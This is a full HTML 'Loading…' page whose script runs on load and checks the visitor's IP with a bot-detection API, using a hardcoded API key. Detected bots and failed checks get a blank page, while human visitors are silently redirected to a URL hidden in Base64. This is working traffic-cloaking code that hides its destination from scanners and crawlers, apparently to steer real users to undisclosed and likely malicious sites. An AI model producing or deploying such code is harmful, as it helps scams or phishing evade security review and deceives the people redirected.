<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Loading…</title>

<style>
  :root {
    --bg: #ffffff;
    --txt: #222222;
    --spin-bg: rgba(0,0,0,0.1);
    --spin-color: #ff3b30;
  }

  @media (prefers-color-scheme: dark) {
    :root {
      --bg: #0e0e0e;
      --txt: #f2f2f2;
      --spin-bg: rgba(255,255,255,0.1);
      --spin-color: #ff453a;
    }
  }

  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    background: var(--bg);
    color: var(--txt);
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
  }

  /* Responsive Spinner */
  #spinner {
    width: min(22vw, 70px);
    height: min(22vw, 70px);
    border-radius: 50%;
    border: 6px solid var(--spin-bg);
    border-top: 6px solid var(--spin-color);
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  #msg {
    margin-top: 14px;
    font-size: clamp(14px, 3vw, 18px);
    color: var(--txt);
  }
</style>

</head>
<body>

<div id="spinner"></div>
<div id="msg">Loading…</div>

<script>
(async () => {

  /* API KEY */
  const API_KEY = "9516c3e4-5fac-44cd-b3da-2007fd0918fb";

  /* URL redirect disimpan dalam Base64 agar rapi */
  const REDIRECT_B64 = "aHR0cHM6Ly9tZWppa3VoaWJpbml1LmdsZWV6ZS5jb20vZ28vNTNiZDA1MmY=";

  /* Decode Base64 → URL */
  const TARGET_URL = atob(REDIRECT_B64);

  try {
    const res = await fetch("https://api.ipdetective.io/ip?info=true", {
      method: "GET",
      headers: {
        "x-api-key": API_KEY,
        "Accept": "application/json"
      },
      cache: "no-store"
    });

    if (!res.ok) {
      document.body.innerHTML = "";
      return;
    }

    const data = await res.json().catch(() => null);
    if (!data) {
      document.body.innerHTML = "";
      return;
    }

    /* Jika bot → tetap blank */
    if (data.bot === true) {
      document.body.innerHTML = "";
      return;
    }

    /* Manusia → redirect */
    window.location.replace(TARGET_URL);

  } catch (e) {
    document.body.innerHTML = "";
  }

})();
</script>

</body>
</html>
